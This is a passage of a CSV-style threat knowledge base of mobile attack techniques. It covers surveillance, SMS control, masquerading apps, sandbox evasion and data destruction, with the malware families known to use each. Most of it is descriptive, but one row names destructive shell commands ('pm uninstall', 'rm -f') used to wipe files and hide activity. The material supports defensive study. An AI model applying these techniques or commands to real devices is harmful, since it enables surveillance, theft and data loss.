executable code from the C2 server after the implant starts or after a specific command.', '[YiSpecter] has used private APIs to download and install other pieces of itself, as well as other malicious apps. ', '[Chameleon] can download new code at runtime.', '[GoldenEagle] can download new code to update itself.', '[SilkBean] can install new applications which are obtained from the C2 server.', '[CHEMISTGAMES] can download new modules while running.', '[Anubis] can download attacker-specified APK files.', '[Mandrake] can download its second (Loader) and third (Core) stages after the dropper is installed.', '[WolfRAT] can update the running malware.', '[ZergHelper] attempts to extend its capabilities via dynamic updating of its code.', '[TERRACOTTA] can download additional modules at runtime via JavaScript `eval` statements.', '[AbstractEmu] can download and install additional malware after initial infection.', '[HenBox] can load additional Dalvik code while running.', '[eSurv] Android version is distributed in three stages: the dropper, the second stage payload, and the third stage payload which is [Exodus]', '[Windshift] has included malware functionality capable of downloading new DEX files at runtime during Operation BULL.', '[RedDrop] downloads additional components (APKs, JAR files) from different C&C servers and stores them dynamically into the device’s memory, allowing the adversary to execute additional malicious APKs without having to embed them straight into the initial sample.']",False
T1468,Remotely Track Device Without Authorization,An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM) / mobile device management (MDM) server console could use that access to track mobile devices.,[],True
T1409,Stored Application Data,"Adversaries may try to access and collect application data resident on the device. Adversaries often target popular applications, such as Facebook, WeChat, and Gmail.      Due to mobile OS sandboxing, this technique is only possible in three scenarios:      * An application stores files in unprotected external storage  * An application stores files in its internal storage directory with insecure permissions (e.g. 777)  * The adversary gains root permissions on the device ","['[Pallas] retrieves messages and decryption keys for popular messaging applications and other accounts stored on the device.', '[BOULDSPY] can retrieve account information for third party services, such as Google, Telegram, WeChat, or WhatsApp.', '[FakeSpy] can collect account information stored on the device, as well as data in external storage.', '[Exodus] Two extracts information from Facebook, Facebook Messenger, Gmail, IMO, Skype, Telegram, Viber, WhatsApp, and WeChat.', '[Mandrake] can collect all accounts stored on the device.', '[FlexiSpy] uses a `FileObserver` object to monitor the Skype and WeChat database file and shared preferences to retrieve chat messages, account information, and profile pictures of the account owner and chat participants. [FlexiSpy] can also spy on popular applications, including Facebook, Hangouts, Hike, Instagram, Kik, Line, QQ, Snapchat, Telegram, Tinder, Viber, and WhatsApp.', '[S.O.V.A.] can gather session cookies from infected devices. [S.O.V.A.] can also abuse Accessibility Services to steal Google Authenticator tokens.', '[Pegasus for Android] accesses sensitive data in files, such as messages stored by the WhatsApp, Facebook, and Twitter applications. It also has the ability to access arbitrary filenames and retrieve directory listings.', '[RCSAndroid] can collect contacts and messages from popular applications, including Facebook Messenger, WhatsApp, Skype, Viber, Line, WeChat, Hangouts, Telegram, and BlackBerry Messenger.', '[FlyTrap] can collect Facebook account information, such as Facebook ID, email address, cookies, and login tokens.', '[YiSpecter] has modified Safari’s default search engine, bookmarked websites, opened pages, and accessed contacts and authorization tokens of the IM program “QQ” on infected devices.', '[Hornbill] can collect voice notes and messages from WhatsApp, if installed.', '[Tangelo] accesses databases from WhatsApp, Viber, Skype, and Line.', '[Desert Scorpion] can collect account information stored on the device.', '[Sunbird] can exfiltrate browser history, BlackBerry Messenger files, IMO instant messaging content, and WhatsApp voice notes.', '[Pegasus for iOS] accesses sensitive data in files, such as saving Skype calls by reading them out of the Skype database files.', '[Escobar] can request the `GET_ACCOUNTS` permission to get the list of accounts on the device, and can collect media files.', '[FrozenCell] has retrieved account information for other applications.', '[SpyDealer] exfiltrates data from over 40 apps such as WeChat, Facebook, WhatsApp, Skype, and others.', '[Skygofree] has a capability to obtain files from other installed applications.', '[DoubleAgent] has accessed browser history, as well as the files for 15 other apps.', '[CarbonSteal] can collect notes and data from the MiCode app.', '[GoldenEagle] has extracted messages from chat programs, such as WeChat.', '[BusyGasper] can collect data from messaging applications, including WhatsApp, Viber, and Facebook.']",False
T1513,Screen Capture,"Adversaries may use screen capture to collect additional information about a target device, such as applications running in the foreground, user data, credentials, or other sensitive information. Applications running in the background can capture screenshots or videos of another application running in the foreground by using the Android `MediaProjectionManager` (generally requires the device user to grant consent). Background applications can also use Android accessibility services to capture screen contents being displayed by a foreground application. An adversary with root access or Android Debug Bridge (adb) access could call the Android `screencap` or `screenrecord` commands. ","['[DEFENSOR ID] can abuse the accessibility service to read any text displayed on the screen.', ' [FlexiSpy] can take screenshots of other applications. ', '[Sunbird] can take screenshots and abuse accessibility services to scrape BlackBerry Messenger and WhatsApp messages, contacts, and notifications', '[S.O.V.A.] can take screenshots and abuse the Android Screen Cast feature to capture screen data.', '[WolfRAT] can record the screen and take screenshots to capture messages from Line, Facebook Messenger, and WhatsApp.', '[SpyDealer] abuses Accessibility features to steal messages from popular apps such as WeChat, Skype, Viber, and QQ.', '[Monokle] can record the screen as the user unlocks the device and can take screenshots of any application in the foreground. [Monokle] can also abuse accessibility features to read the screen to capture data from a large number of popular applications.', '[Ginp] can capture device screenshots and stream them back to the C2.', '[Mandrake] can record the screen.', '[TangleBot] can record the screen and stream the data off the device.', '[Drinik] can record the screen via the `MediaProjection` library to harvest user credentials, including biometric PINs.', '[BOULDSPY] can take and exfiltrate screenshots.', '[Tiktok Pro] can take screenshots.', '[Anubis] can take screenshots.', '[Hornbill] can take screenshots and can abuse accessibility services to scrape WhatsApp messages, contacts, and notifications.', '[EventBot] can abuse Android’s accessibility service to capture data from installed applications.', '[TrickMo] can use the `MediaRecorder` class to record the screen when the targeted application is presented to the user, and can abuse accessibility features to record targeted applications to intercept transaction authorization numbers (TANs) and to scrape on-screen text.', '[GoldenEagle] has taken screenshots.', '[GolfSpy] can take screenshots.', '[BusyGasper] can use its keylogger module to take screenshots of the area of the screen that the user tapped.', ' [Exodus] Two can take screenshots of any application in the foreground. ']",False
T1452,Manipulate App Store Rankings or Ratings,An adversary could use access to a compromised device's credentials to attempt to manipulate app store rankings or ratings by triggering application downloads or posting fake reviews of applications. This technique likely requires privileged access (a rooted or jailbroken device).,[],True
T1416,URI Hijacking,"Adversaries may register Uniform Resource Identifiers (URIs) to intercept sensitive data.  Applications regularly register URIs with the operating system to act as a response handler for various actions, such as logging into an app using an external account via single sign-on. This allows redirections to that specific URI to be intercepted by the application. If a malicious application were to register for a URI that was already in use by a genuine application, the malicious application may be able to intercept data intended for the genuine application or perform a phishing attack against the genuine application. Intercepted data may include OAuth authorization codes or tokens that could be used by the malicious application to gain access to resources.",[],True
T1523,Evade Analysis Environment,"Malicious applications may attempt to detect their operating environment prior to fully executing their payloads. These checks are often used to ensure the application is not running within an analysis environment such as a sandbox used for application vetting, security research, or reverse engineering.  Adversaries may use many different checks such as physical sensors, location, and system properties to fingerprint emulators and sandbox environments. Adversaries may access `android.os.SystemProperties` via Java reflection to obtain specific system information. Standard values such as phone number, IMEI, IMSI, device IDs, and device drivers may be checked against default signatures of common sandboxes. ",[],True
T1632,Subvert Trust Controls,Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted applications. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features include: an app being allowed to run because it is signed by a valid code signing certificate; an OS prompt alerting the user that an app came from an untrusted source; or getting an indication that you are about to connect to an untrusted site. The method adversaries use will depend on the specific mechanism they seek to subvert. ,[],False
T1433,Access Call Log,"On Android, an adversary could call standard operating system APIs from a malicious application to gather call log data, or with escalated privileges could directly access files containing call log data.  On iOS, applications do not have access to the call log, so privilege escalation would be required in order to access the data.",[],True
T1581,Geofencing,"Adversaries may use a device’s geographical location to limit certain malicious behaviors. For example, malware operators may limit the distribution of a second stage payload to certain geographic regions.  [Geofencing] is accomplished by persuading the user to grant the application permission to access location services. The application can then collect, process, and exfiltrate the device’s location to perform location-based actions, such as ceasing malicious behavior or showing region-specific advertisements.  One method to accomplish [Geofencing] on Android is to use the built-in Geofencing API to automatically trigger certain behaviors when the device enters or exits a specified radius around a geographical location. Similar to other [Geofencing] methods, this requires that the user has granted the `ACCESS_FINE_LOCATION` and `ACCESS_BACKGROUND_LOCATION` permissions. The latter is only required if the application targets Android 10 (API level 29) or higher. However, Android 11 introduced additional permission controls that may restrict background location collection based on user permission choices at runtime. These additional controls include “Allow only while using the app”, which will effectively prohibit background location collection.  Similarly, on iOS, developers can use built-in APIs to setup and execute geofencing. Depending on the use case, the app will either need to call `requestWhenInUseAuthorization()` or `requestAlwaysAuthorization()`, depending on when access to the location services is required. Similar to Android, users also have the option to limit when the application can access the device’s location, including one-time use and only when the application is running in the foreground.  [Geofencing] can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. For example, location data could be used to limit malware spread and/or capabilities, which could also potentially evade application analysis environments (ex: malware analysis outside of the target geographic area). Other malicious usages could include showing language-specific [Input Prompt] and/or advertisements.",[],True
T1401,Device Administrator Permissions,"Adversaries may request device administrator permissions to perform malicious actions.  By abusing the device administration API, adversaries can perform several nefarious actions, such as resetting the device’s password for [Device Lockout] factory resetting the device to [Delete Device Data] and any traces of the malware, disabling all of the device’s cameras, or make it more difficult to uninstall the app.  Device administrators must be approved by the user at runtime, with a system popup showing which of the actions have been requested by the app. In conjunction with other techniques, such as [Input Injection] an app can programmatically grant itself administrator permissions without any user input.",[],True
T1443,Remotely Install Application,,[],True
T1403,Modify Cached Executable Code,"ART (the Android Runtime) compiles optimized code on the device itself to improve performance. An adversary may be able to use escalated privileges to modify the cached code in order to hide malicious behavior. Since the code is compiled on the device, it may not receive the same level of integrity checks that are provided to code running in the system partition.",[],False
T1419,Device Type Discovery,"On Android, device type information is accessible to apps through the android.os.Build class . Device information could be used to target privilege escalation exploits.","['[ANDROIDOS_ANSERVER.A] gathers the device build version, manufacturer, and model.']",True
T1576,Uninstall Malicious Application,"Adversaries may include functionality in malware that uninstalls the malicious application from the device. This can be achieved by:  * Abusing device owner permissions to perform silent uninstallation using device owner API calls. * Abusing root permissions to delete files from the filesystem. * Abusing the accessibility service. This requires an intent be sent to the system to request uninstallation, and then abusing the accessibility service to click the proper places on the screen to confirm uninstallation.",[],True
T1447,Delete Device Data,"Adversaries may wipe a device or delete individual files in order to manipulate external outcomes or hide activity. An application must have administrator access to fully wipe the device, while individual files may not require special permissions to delete depending on their storage location.   Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The impact file deletion will have depends on the type of data as well as the goals and objectives of the adversary, but can include deleting update files to evade detection or deleting attacker-specified files for impact.",[],True
T1448,Carrier Billing Fraud,"A malicious app may trigger fraudulent charges on a victim’s carrier billing statement in several different ways, including SMS toll fraud and SMS shortcodes that make purchases.  Performing SMS fraud relies heavily upon the fact that, when making SMS purchases, the carriers perform device verification but not user verification. This allows adversaries to make purchases on behalf of the user, with little or no user interaction.  Malicious applications may also perform toll billing, which occurs when carriers provide payment endpoints over a web page. The application connects to the web page over cellular data so the carrier can directly verify the number, or the application must retrieve a code sent via SMS and enter it into the web page.  On iOS, apps cannot send SMS messages.  On Android, apps must hold the `SEND_SMS` permission to send SMS messages. Additionally, Android version 4.2 and above has mitigations against this threat by requiring user consent before allowing SMS messages to be sent to premium numbers .",[],True
T1415,URL Scheme Hijacking,"An iOS application may be able to maliciously claim a URL scheme, allowing it to intercept calls that are meant for a different application. This technique, for example, could be used to capture OAuth authorization codes or to phish user credentials.",[],True
T1509,Non-Standard Port,"Adversaries may generate network traffic using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.","['[Cerberus] communicates with the C2 using HTTP requests over port 8888.', '[Chameleon] can communicate over port 7242 using HTTP.', '[Mandrake] has communicated with the C2 server over TCP port 7777.', '[INSOMNIA] has communicated with the C2 using HTTPS requests over ports 43111, 43223, and 43773.', '[FlexiSpy] can communicate with the command and control server over ports 12512 and 12514.', '[Red Alert 2.0] has communicated with the C2 using HTTP requests over port 7878.', '[Exodus] Two attempts to connect to port 22011 to provide a remote reverse shell.']",False
T1430,Location Tracking,"Adversaries may track a device’s physical location through use of standard operating system APIs via malicious or exploited applications on the compromised device.      On Android, applications holding the `ACCESS_COAURSE_LOCATION` or `ACCESS_FINE_LOCATION` permissions provide access to the device’s physical location. On Android 10 and up, declaration of the `ACCESS_BACKGROUND_LOCATION` permission in an application’s manifest will allow applications to request location access even when the application is running in the background. Some adversaries have utilized integration of Baidu map services to retrieve geographical location once the location access permissions had been obtained.      On iOS, applications must include the `NSLocationWhenInUseUsageDescription`, `NSLocationAlwaysAndWhenInUseUsageDescription`, and/or `NSLocationAlwaysUsageDescription` keys in their `Info.plist` file depending on the extent of requested access to location information. On iOS 8.0 and up, applications call `requestWhenInUseAuthorization()` to request access to location information when the application is in use or `requestAlwaysAuthorization()` to request access to location information regardless of whether the application is in use. With elevated privileges, an adversary may be able to access location data without explicit user consent with the `com.apple.locationd.preauthorized` entitlement key.","['[FrozenCell] has used an online cell tower geolocation service to track targets.', '[INSOMNIA] can track the device’s location.', ""[SpyNote RAT] collects the device's location."", '[Tiktok Pro] can track the device’s location.', ""[PJApps] has the capability to collect and leak the victim's location."", '[TangleBot] can request location permissions.', ""[Skygofree] can track the device's location."", '[Chameleon] can gather device location data.', '[CHEMISTGAMES] has collected the device’s location.', '[Corona Updates] can track the device’s location.', '[Fakecalls] can access a device’s location.', '[GolfSpy] can track the device’s location.', '[Escobar] can request coarse and fine location permissions to track the device.', '[GoldenEagle] has tracked location.', '[Hornbill] can access a device’s location and check if GPS is enabled. [Hornbill] has logic to only log location changes greater than 70 meters.', '[Cerberus] can collect the device’s location.', '[eSurv] can track the device’s location.', '[Sunbird] can access a device’s location.', '[Tangelo] contains functionality to gather GPS coordinates.', '[ViperRAT] can track the device’s location.', '[Anubis] can retrieve the device’s GPS location.', '[Charger] checks the local settings of the device and does not run its malicious logic if the device is located in Ukraine, Russia, or Belarus.', '[Golden Cup] can track the device’s location.', '[Adups] transmitted location information.', '[FlyTrap] can collect device geolocation data.', '[Pegasus for iOS] update and sends the location of the phone.', '[Desert Scorpion] can track the device’s location.', '[Android/Chuli.A] stole geo-location data.', '[X-Agent for Android] was believed to have been used to obtain locational data of Ukrainian artillery forces.', '[CarbonSteal] can access the device’s location and track the device over time.', '[ViceLeaker] can collect location information, including GPS coordinates.', '[Pallas] tracks the latitude and longitude coordinates of the infected device.', '[BusyGasper] can collect the device’s location information based on cellular network or GPS coordinates.', '[FinFisher] tracks the latitude and longitude coordinates of the infected device.', '[Windshift] has included location tracking capabilities in the malicious apps deployed as part of Operation BULL and Operation ROCK.', '[Mandrake] can collect the device’s location.', '[SpyDealer] harvests location data from victims.', ""[Monokle] can track the device's location."", ""[AbstractEmu] can access a device's location."", '[HenBox] can track the device’s location.', '[SilkBean] has access to the device’s location.', '[Exodus] Two can extract the GPS coordinates of the device.', '[RCSAndroid] can record location.', "" [FlexiSpy] can track the device's location."", '[GPlayed] can request the device’s location.', '[Stealth Mango] can perform GPS location tracking as well as capturing coordinates as when an SMS message or call is received.', '[AndroRAT] tracks the device location.', '[BOULDSPY] can get a device’s location using GPS or network.']",False
T1446,Device Lockout,"An adversary may seek to lock the legitimate user out of the device, for example to inhibit user interaction or to obtain a ransom payment.  On Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode to prevent the user from unlocking the device. After Android 7, only device or profile owners (e.g. MDMs) can reset the device’s passcode.  On iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode, they cannot set a new passcode. However, on jailbroken devices, malware has been discovered that can lock the user out of the device.",['[KeyRaider] has built-in functionality to lock victims out of devices and hold them for ransom.'],True
T1662,Data Destruction,"Adversaries may destroy data and files on specific devices or in large numbers to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.    To achieve data destruction, adversaries may use the `pm uninstall` command to uninstall packages or the `rm` command to remove specific files. For example, adversaries may first use `pm uninstall` to uninstall non-system apps, and then use `rm (-f) <file(s)>` to delete specific files, further hiding malicious activity.",[],False
T1427,Attack PC via USB Connection,"With escalated privileges, an adversary could program the mobile device to impersonate USB devices such as input devices (keyboard and mouse), storage devices, and/or networking devices in order to attack a physically connected PC This technique has been demonstrated on Android. We are unaware of any demonstrations on iOS.",[],False
T1441,Stolen Developer Credentials or Signing Keys,,[],True
T1467,Rogue Cellular Base Station,An adversary could set up a rogue cellular base station and then use it to eavesdrop on or manipulate cellular device communication. A compromised cellular femtocell could be used to carry out this technique.,[],True
T1451,SIM Card Swap,"An adversary could convince the mobile network operator (e.g. through social networking, forged identification, or insider attacks performed by trusted employees) to issue a new SIM card and associate it with an existing phone number and account. The adversary could then obtain SMS messages or hijack phone calls intended for someone else.  One use case is intercepting authentication messages or phone calls to obtain illicit access to online banking or other online accounts, as many online services allow account password resets by sending an authentication code over SMS to a phone number associated with the account.",[],False
T1417,Input Capture,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal device usage, users often provide credentials to various locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Keylogging] or rely on deceiving the user into providing input into what they believe to be a genuine application prompt (e.g. [GUI Input Capture]",[],False
T1643,Generate Traffic from Victim,"Adversaries may generate outbound traffic from devices. This is typically performed to manipulate external outcomes, such as to achieve carrier billing fraud or to manipulate app store rankings or ratings. Outbound traffic is typically generated as SMS messages or general web traffic, but may take other forms as well.  If done via SMS messages, Android apps must hold the `SEND_SMS` permission. Additionally, sending an SMS message requires user consent if the recipient is a premium number. Applications cannot send SMS messages on iOS","['[Android/AdDisplay.Ashas] can generate revenue by automatically displaying ads.', '[TERRACOTTA] has generated non-human advertising impressions.', '[Judy] uses infected devices to generate fraudulent clicks on advertisements to generate revenue.', '[RedDrop] tricks the user into sending SMS messages to premium services and then deletes those messages.', '[Gooligan] can install adware to generate revenue.', '[PJApps] has the capability to send messages to premium SMS messages.', '[Agent Smith] shows fraudulent ads to generate revenue.', '[MazarBOT] can send messages to premium-rate numbers.', '[BrainTest] provided capabilities that allowed developers to use compromised devices to post positive reviews on their own malicious applications as well as download other malicious applications they had submitted to the Play Store.', '[SimBad] generates fraudulent advertising revenue by displaying ads in the background and by opening the browser and displaying ads.', '[HummingWhale] generates revenue by displaying fraudulent ads and automatically installing apps. When victims try to close the ads, [HummingWhale] runs in a virtual machine, creating a fake ID that allows the perpetrators to generate revenue.', '[Bread] can perform SMS fraud on older versions of the malware, and toll fraud on newer versions.', '[Zen] can simulate user clicks on ads.', '[Triada] can redirect ad banner URLs on websites visited by the user to specific ad URLs. ', '[HummingBad] can create fraudulent statistics inside the official Google Play Store, and has generated revenue from installing fraudulent apps and displaying malicious advertisements.', 'In July 2016, [HummingBad] generated more than $300,000 per month in revenue from installing fraudulent apps and displaying malicious advertisements.', '[Bread] had many fake reviews and ratings on the Play Store. ']",False
T1444,Masquerade as Legitimate Application,"An adversary could distribute developed malware by masquerading the malware as a legitimate application. This can be done in two different ways: by embedding the malware in a legitimate application, or by pretending to be a legitimate application.  Embedding the malware in a legitimate application is done by downloading the application, disassembling it, adding the malicious code, and then re-assembling it. The app would appear to be the original app, but would contain additional malicious functionality. The adversary could then publish the malicious application to app stores or use another delivery method.  Pretending to be a legitimate application relies heavily on lack of scrutinization by the user. Typically, a malicious app pretending to be a legitimate one will have many similar details as the legitimate one, such as name, icon, and description.  Malicious applications may also masquerade as legitimate applications when requesting access to the accessibility service in order to appear as legitimate to the user, increasing the likelihood that the access will be granted.","['[ViperRAT] second stage has masqueraded as “System Updates”, “Viber Update”, and “WhatsApp Update”.', '[Anubis] has requested accessibility service privileges while masquerading as ""Google Play Protect"" and has disguised additional malicious application installs as legitimate system updates.', '[AndroidOS/MalLocker.B] has masqueraded as popular apps, cracked games, and video players. ', '[Mandrake] can mimic an app called “Storage Settings” if it cannot hide its icon.', '[EventBot] has used icons from popular applications.', '[DoubleAgent] has been embedded into trojanized versions of applications such as Voxer, TalkBox, and Amaq News.', '[Asacub] has masqueraded as a client of popular free ads services.', '[Dendroid] can be bound to legitimate applications prior to installation on devices.', '[Agent Smith] can impersonate any popular application on an infected device, and the core malware disguises itself as a legitimate Google application. [Agent Smith] dropper is a weaponized legitimate Feng Shui Bundle. ', '[Ginp] has masqueraded as “Adobe Flash Player” and “Google Play Verificator”.', '[XLoader for Android] has masqueraded as an Android security application.', '[DroidJack] included code from the legitimate Pokemon GO app in order to appear identical to the user, but it also included additional malicious code.', '[Tiktok Pro] has masqueraded as TikTok.', '[CHEMISTGAMES] has masqueraded as popular South Korean applications.', '[FakeSpy] masquerades as local postal service applications.', '[Cerberus] has pretended to be an Adobe Flash Player installer.', '[GPlayed] has used the Play Store icon as well as the name “Google Play Marketplace”.', '[HenBox] has masqueraded as VPN and Android system apps.', '[SimBad] was embedded into legitimate applications.', '[FrozenCell] has masqueraded as fake updates to chat applications such as Facebook, WhatsApp, Messenger, LINE, and LoveChat, as well as apps targeting Middle Eastern demographics. ', '[ViceLeaker] was embedded into legitimate applications using Smali injection.', '[Android/AdDisplay.Ashas] has mimicked Facebook and Google icons on the “Recent apps” screen to avoid discovery and uses the `com.google.xxx` package name to avoid detection.', '[SilkBean] has been incorporated into trojanized applications, including Uyghur/Arabic focused keyboards, alphabets, and plugins, as well as official-looking Google applications.', '[Bouncing Golf] distributed malware as repackaged legitimate applications, with the malicious code in the `com.golf` package.', '[CarbonSteal] has impersonated several apps, including official Google apps, chat apps, VPN apps, and popular games.', '[WolfRAT] has masqueraded as “Google service”, “GooglePlay”, and “Flash update”.', '[Red Alert 2.0] has masqueraded as legitimate media player, social media, and VPN applications.', '[X-Agent for Android] was placed in a repackaged version of an application used by Ukrainian artillery forces.', '[GoldenEagle] has inserted trojan functionality into legitimate apps, including popular apps within the Uyghur community, VPNs, instant messaging apps, social networking, games, adult media, and Google searching.', '[Exobot] has used names like WhatsApp and Netflix.', '""Malicious actors behind"" Shedun ""repackage and inject malicious code into thousands of popular applications found in Google Play, and then later publish them to third-party app stores. Indeed, we believe many of these apps are actually fully-functional, providing their usual services, in addition to the malicious code that roots the device.""']",False
T1457,Malicious Media Content,,[],True
T1582,SMS Control,"Adversaries may delete, alter, or send SMS messages without user authorization. This could be used to hide C2 SMS messages, spread malware, or various external effects.  This can be accomplished by requesting the `RECEIVE_SMS` or `SEND_SMS` permissions depending on what the malware is attempting to do. If the app is set as the default SMS handler on the device, the `SMS_DELIVER` broadcast intent can be registered, which allows the app to write to the SMS content provider. The content provider directly modifies the messaging database on the device, which could allow malicious applications with this ability to insert, modify, or delete arbitrary messages on the device.","['[Drinik] can steal incoming SMS messages and send SMS messages from compromised devices. ', '[Corona Updates] can send SMS messages.', '[FluBot] can send SMS phishing messages to other contacts on an infected device.', '[GPlayed] can send SMS messages.', ' [SilkBean] can send SMS messages. ', '[Red Alert 2.0] can send SMS messages.', '[Exobot] can forward SMS messages.', '[Stealth Mango] deletes incoming SMS messages from specified numbers, including those that contain particular strings.', '[Anubis] can send, receive, and delete SMS messages.', '[WolfRAT] can delete and send SMS messages.', '[Tiktok Pro] can send SMS messages.', '[Mandrake] can block, forward, hide, and send SMS messages.', '[Cerberus] can send SMS messages from a device.', '[GoldenEagle] has sent messages to an attacker-controlled number.', '[Dendroid] can send and block SMS messages.', '[SharkBot] can hide and send SMS messages. [SharkBot] can also change which application is the device’s default SMS handler.', '[Asacub] can send SMS messages from compromised devices. ', '[TangleBot] can send text messages.', '[FakeSpy] can send SMS messages.', '[TrickMo] can delete SMS messages.', '[Desert Scorpion] can send SMS messages.', '[BusyGasper] can send an SMS message after the device boots, messages containing logs, messages to adversary-specified numbers with custom content, and can delete all SMS messages on the device.', '[S.O.V.A.] can send SMS messages.', '[Escobar] can modify, send, and delete SMS messages.', '[Rotexy] can automatically reply to SMS messages, and optionally delete them.', '[Ginp] can send SMS messages.', '[TERRACOTTA] can send SMS messages.']",False
T1408,Disguise Root/Jailbreak Indicators,"An adversary could use knowledge of the techniques used by security software to evade detection. For example, some mobile security products perform compromised device detection by searching for particular artifacts such as an installed ""su"" binary, but that check could be evaded by naming the binary something else. Similarly, polymorphic code techniques could be used to evade signature-based detection.",[],True
T1438,Exfiltration Over Other Network Medium,"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a standard Internet connection, the exfiltration may occur, for example, via Bluetooth, or another radio frequency (RF) channel.   Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network. ",[],True
T1440,Detect App Analysis Environment,,"['Pegasus for Android attempts to detect whether it is running in an emulator rather than a real device.', 'Charger ""checks whether it is being run in an emulator before it starts its malicious activity"".', 'ZergHelper ""appears to have gotten by Apple’s app review process by performing different behaviors for users from different physical locations...For users outside of China, it would act as what it claimed: an English studying app. However, when accessing the app from China, its real features would appear."" Presumably, Apple\'s app review occurred outside of China and the ""real features"" were not visible during the review.']",True
T1631,Process Injection,"Adversaries may inject code into processes in order to evade process-based defenses or even elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.   Both Android and iOS have no legitimate way to achieve process injection. The only way this is possible is by abusing existing root access or exploiting a vulnerability.",[],False
T1462,Malicious Software Development Tools,,"[""XcodeGhost was injected into apps by a modified version of Xcode (Apple's software development tool).""]",True
T1402,Broadcast Receivers,"An intent is a message passed between Android application or system components. Applications can register to receive broadcast intents at runtime, which are system-wide intents delivered to each app when certain events happen on the device, such as network changes or the user unlocking the screen. Malicious applications can then trigger certain actions within the app based on which broadcast intent was received.  Further, malicious applications can register for intents broadcasted by other applications in addition to the Android system itself. This allows the malware to respond based on actions in other applications. This behavior typically indicates a more intimate knowledge, or potentially the targeting of specific devices, users, or applications.  In Android 8 (API level 26), broadcast intent behavior was changed, limiting the implicit intents that applications can register for in the manifest. In most cases, applications that register through the manifest will no longer receive the broadcasts. Now, applications must register context-specific broadcast receivers while the user is actively using the app.",[],True
T1414,Clipboard Data,"Adversaries may abuse clipboard manager APIs to obtain sensitive information copied to the device clipboard. For example, passwords being copied and pasted from a password manager application could be captured by a malicious application installed on the device.      On Android, applications can use the `ClipboardManager.OnPrimaryClipChangedListener()` API to register as a listener and monitor the clipboard for changes. However, starting in Android 10, this can only be used if the application is in the foreground, or is set as the device’s default input method editor (IME).      On iOS, this can be accomplished by accessing the `UIPasteboard.general.string` field. However, starting in iOS 14, upon accessing the clipboard, the user will be shown a system notification if the accessed text originated in a different application. For example, if the user copies the text of an iMessage from the Messages application, the notification will read “application_name has pasted from Messages” when the text was pasted in a different application.","['[XcodeGhost] can read and write data in the user’s clipboard.', '[GolfSpy] can obtain clipboard contents.', '[BOULDSPY] can collect clipboard data.', '[RCSAndroid] can monitor clipboard content.']",False
T1400,Modify System Partition,"If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device system partition, where it may persist after device resets and may not be easily removed by the device user.  Many Android devices provide the ability to unlock the bootloader for development purposes. An unlocked bootloader may provide the ability for an adversary to modify the system partition. Even if the bootloader is locked, it may be possible for an adversary to escalate privileges and then modify the system partition.",[],True
T1641,Data Manipulation,"Adversaries may insert, delete, or alter data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.  The type of modification and the impact it will have depends on the target application, process, and the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system, typically gained through a prolonged information gathering campaign, in order to have the desired impact.",[],False
T1481,Web Service,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media, acting as a mechanism for C2, may give a significant amount of cover. This is due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.      Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed).    ",[],False
T1455,Exploit Baseband Vulnerability,,[],True
T1634,Credentials from Password Store,"Adversaries may search common password storage locations to obtain user credentials. Passwords can be stored in several places on a device, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users to manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",[],False
T1617,Hooking,"Adversaries may utilize hooking to hide the presence of artifacts associated with their behaviors to evade detection. Hooking can be used to modify return values or data structures of system APIs and function calls. This process typically involves using 3rd party root frameworks, such as Xposed or Magisk, with either a system exploit or pre-existing root access. By including custom modules for root frameworks, adversaries can hook system APIs and alter the return value and/or system data structures to alter functionality/visibility of various aspects of the system.",[' [Monokle] can hook itself to appear invisible to the Process Manager. '],
T1478,Install Insecure or Malicious Configuration,"An adversary could attempt to install insecure or malicious configuration settings on the mobile device, through means such as phishing emails or text messages either directly containing the configuration settings as an attachment, or containing a web link to the configuration settings. The device user may be tricked into installing the configuration settings through social engineering techniques .  For example, an unwanted Certification Authority (CA) certificate could be placed in the device's trusted certificate store, increasing the device's susceptibility to adversary-in-the-middle network attacks seeking to eavesdrop on or manipulate the device's network communication ([Eavesdrop on Insecure Network Communication] and [Manipulate Device Communication]  On iOS, malicious Configuration Profiles could contain unwanted Certification Authority (CA) certificates or other insecure settings such as unwanted proxy server or VPN settings to route the device's network traffic through an adversary's system. The device could also potentially be enrolled into a malicious Mobile Device Management (MDM) system .",[],True
